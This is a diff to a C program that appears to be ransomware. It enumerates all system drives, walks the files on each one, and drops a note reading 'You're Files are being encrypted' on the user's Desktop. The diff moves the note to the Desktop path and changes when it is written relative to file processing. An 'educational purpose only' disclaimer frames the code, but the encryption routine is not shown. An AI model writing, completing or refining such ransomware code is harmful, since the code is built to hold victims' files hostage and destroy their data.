@@ -9,7 +9,7 @@ Educational purpose only
 I'm not responsible for your actions
 */
 
-char* drives[26];
+char* drives[28];
 
 
 int check_path(char* path){
@@ -52,16 +52,17 @@ void get_drives(){
 
 int msg(){
     FILE* fptr;
-    char buffer[3000];
+    char path[500];
+    char *get_user_path = getenv("USERPROFILE");
+    sprintf(path, "%s\\Desktop\\readme.txt", get_user_path);
+    printf("path: %s\n", path);
 
-    if ((fptr = fopen("readme.txt", "w")) == NULL){
+    if ((fptr = fopen(path, "w")) == NULL){
         return 1;
     }
-    sprintf(buffer, "%s", "Hello, World!");
 
-    fprintf(fptr, "%s\n", buffer);
-
-    fclose(fptr);
+    fprintf(fptr, "%s", "Hello, World!\nYou're Files are being encrypted\n\n\nEducational purpose only");
+    fclose(fptr);    
 
     return 0;
 }
@@ -131,10 +132,10 @@ int main(){
     get_drives();
 
     for (int i = 0; *drives[i] != '\0'; i++){
-        get_file(drives[i]);
         if (*drives[i+1] == '\0'){
             msg();
         }
+        get_file(drives[i]);
     }
     
     return 0;
